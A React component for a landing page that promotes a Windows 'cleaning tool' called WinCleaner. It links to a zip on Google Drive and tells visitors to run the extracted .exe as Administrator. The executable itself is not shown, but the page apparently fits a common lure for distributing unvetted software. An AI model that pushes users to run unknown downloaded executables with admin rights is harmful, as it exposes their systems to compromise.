import React from 'react';
import { Container, Typography, Button, Box, Paper } from '@mui/material';
import { motion } from 'framer-motion';

const WinCleaner = () => {
  return (
    <Container maxWidth="xl">
      <Box 
        sx={{ 
          minHeight: '100vh', 
          pt: 10, 
          pb: 4,
          position: 'relative',
          '&::before': {
            content: '""',
            position: 'absolute',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: 'radial-gradient(circle at 50% 50%, rgba(147, 112, 219, 0.1) 0%, transparent 50%)',
            animation: 'pulse 8s ease-in-out infinite',
            zIndex: -1
          }
        }}
      >
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
        >
          <Typography 
            variant="h2" 
            component="h1" 
            gutterBottom
            sx={{
              color: '#E6E6FA',
              textAlign: 'center',
              textShadow: '0 0 20px rgba(147, 112, 219, 0.5)',
              fontWeight: 'bold',
              mb: 4,
              position: 'relative',
              '&::after': {
                content: '""',
                position: 'absolute',
                bottom: -10,
                left: '50%',
                transform: 'translateX(-50%)',
                width: '100px',
                height: '3px',
                background: 'linear-gradient(90deg, transparent, rgba(147, 112, 219, 0.8), transparent)',
                animation: 'shimmer 2s infinite'
              }
            }}
          >
            WinCleaner
          </Typography>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.2 }}
        >
          <Typography 
            variant="h5" 
            gutterBottom
            sx={{
              textAlign: 'center',
              color: '#E6E6FA',
              textShadow: '0 2px 4px rgba(0,0,0,0.2)'
            }}
          >
            Optimize your Windows system with our powerful cleaning tool
          </Typography>
        </motion.div>

        <Box sx={{ display: 'flex', justifyContent: 'center', mt: 4 }}>
          <motion.div
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8, delay: 0.4 }}
            whileHover={{ scale: 1.02 }}
            style={{ width: '100%', maxWidth: 600 }}
          >
            <Paper 
              sx={{ 
                p: 4,
                background: 'rgba(75, 0, 130, 0.4)',
                backdropFilter: 'blur(20px)',
                border: '1px solid rgba(147, 112, 219, 0.3)',
                boxShadow: '0 8px 32px rgba(31, 38, 135, 0.37)',
                borderRadius: '20px',
                transition: 'all 0.3s ease',
                '&:hover': {
                  boxShadow: '0 8px 32px rgba(147, 112, 219, 0.5)',
                  border: '1px solid rgba(147, 112, 219, 0.5)',
                },
              }}
            >
              <Typography variant="h6" gutterBottom sx={{ color: '#E6E6FA' }}>
                Optimize your Windows system with our powerful cleaning tool
              </Typography>
              <Typography paragraph sx={{ color: '#E6E6FA' }}>
                Download and extract the zip file. After extracting, open the .exe file by "Run as Administrator".
              </Typography>
              <motion.div
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
              >
                <Button 
                  variant="contained" 
                  href="https://drive.usercontent.google.com/download?id=1hwc0WcJbgWXrGJ8UoDRGzvpMhXNLkShE&export=download&authuser=0"
                  target="_blank"
                  sx={{ 
                    background: 'linear-gradient(45deg, #9370DB 30%, #8A2BE2 90%)',
                    color: 'white',
                    padding: '12px 24px',
                    fontSize: '1.1rem',
                    textTransform: 'none',
                    borderRadius: '10px',
                    position: 'relative',
                    overflow: 'hidden',
                    '&::before': {
                      content: '""',
                      position: 'absolute',
                      top: 0,
                      left: 0,
                      width: '100%',
                      height: '100%',
                      background: 'linear-gradient(45deg, transparent, rgba(255,255,255,0.2), transparent)',
                      transform: 'translateX(-100%)',
                      transition: 'transform 0.6s ease',
                    },
                    '&:hover': {
                      background: 'linear-gradient(45deg, #8A2BE2 30%, #9370DB 90%)',
                      transform: 'translateY(-2px)',
                      boxShadow: '0 8px 20px rgba(147, 112, 219, 0.4)',
                      '&::before': {
                        transform: 'translateX(100%)',
                      }
                    },
                  }}
                >
                  Download WinCleaner
                </Button>
              </motion.div>
            </Paper>
          </motion.div>
        </Box>
      </Box>
      <style jsx global>{`
        @keyframes pulse {
          0%, 100% { transform: scale(1); opacity: 0.5; }
          50% { transform: scale(1.1); opacity: 0.8; }
        }
        @keyframes shimmer {
          0% { transform: translateX(-150%) skewX(-45deg); }
          100% { transform: translateX(150%) skewX(-45deg); }
        }
      `}</style>
    </Container>
  );
};

export default WinCleaner; 